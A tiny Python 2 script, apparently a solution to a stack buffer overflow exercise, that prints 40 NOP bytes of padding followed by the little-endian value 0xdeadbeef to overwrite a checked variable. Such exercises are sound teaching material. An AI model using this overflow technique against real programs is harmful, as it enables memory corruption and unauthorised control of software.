from struct import *

p = lambda x : pack("<L", x)

var_check = 0xdeadbeef

payload = ""
payload += "\x90"*(56-16)
payload += p(var_check)

print payload